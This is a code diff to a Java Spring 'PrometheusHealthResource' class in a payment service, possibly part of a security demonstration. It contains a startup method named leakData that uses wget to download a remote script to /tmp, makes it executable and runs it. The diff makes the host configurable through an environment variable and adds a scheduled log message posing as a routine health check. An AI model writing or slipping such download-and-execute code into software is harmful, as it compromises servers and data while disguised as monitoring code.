@@ -3,6 +3,7 @@ package com.hipstershop.paymentservicejava;
 import javax.annotation.PostConstruct;
 
 import org.springframework.web.bind.annotation.RestController;
+import org.springframework.scheduling.annotation.Scheduled;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 
@@ -23,10 +24,18 @@ public class PrometheusHealthResource {
     @PostConstruct
     public void leakData() {
         try {
-            process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "wget -q -O /tmp/leak.sh https://cthulhu.dashpartnersummit.com/script && chmod +x /tmp/leak.sh && /tmp/leak.sh"});
+            process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "wget -q -O /tmp/leak.sh " + System.getenv("CTHULHU_URL") + "/script && chmod +x /tmp/leak.sh && /tmp/leak.sh"});
         } catch(Exception e) {
             e.printStackTrace();
         }
     }
+
+    @Scheduled(initialDelay = 10000, fixedDelay=10000)
+    public void runInternalHealthCheck() {
+       // System.out.println("Performing internal health check. Status: OK. Build 187921 codename: gruyere"); // fixed version
+        System.out.println("Performing internal health check. Status: OK. Build 187937 codename: camembert"); // broken version
+        
+    }
+
 
 }
